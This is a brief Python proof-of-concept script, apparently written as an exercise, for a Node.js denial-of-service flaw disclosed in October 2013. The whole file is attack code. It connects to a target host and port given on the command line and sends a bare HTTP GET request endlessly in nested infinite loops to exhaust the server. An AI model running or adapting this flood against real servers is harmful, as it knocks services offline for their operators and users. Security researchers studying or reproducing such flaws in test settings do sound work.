#!/usr/bin/python

# quick and very dirty proof of concept script for the Node.js DOS
# vulnerability (sort of) disclosed in October 2013, written as an 
# exercise in Python and HTTP.

import sys
import socket

if len(sys.argv) < 3:
	print("Usage " + sys.argv[0] + " <host> <port")
	exit()

req = "GET / HTTP/1.1\r\n\r\n"
host = sys.argv[1]
port = int(sys.argv[2])

def blast():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	while 1:
		sent = s.sendall(req)

# Just in case we fail above. But this shouldn't be necessary.
while 1:
	blast()
